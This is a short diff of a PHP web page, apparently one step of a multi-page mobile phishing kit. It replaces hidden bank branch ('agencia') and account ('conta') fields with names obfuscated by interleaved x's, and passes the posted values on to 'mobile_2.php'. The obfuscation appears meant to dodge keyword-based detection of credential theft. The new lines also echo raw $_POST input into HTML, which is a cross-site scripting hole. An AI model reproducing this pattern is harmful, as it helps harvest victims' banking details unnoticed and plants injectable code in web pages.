@@ -185,8 +185,8 @@ hr.style13 {
 </head>
 <body>
 <form action="mobile_2.php" method="post" name="formulario" id="formulario">
-	<input type="hidden" id="agencia" name="agencia" value="2342">
-	<input type="hidden" id="conta" name="conta" value="4234342343">
+	<input type="hidden" id="xaxgxexnxcxixax" name="xaxgxexnxcxixax" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>">
+	<input type="hidden" id="xcxoxnxtxa" name="xcxoxnxtxa" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
 </form>
 
 <div class="container">
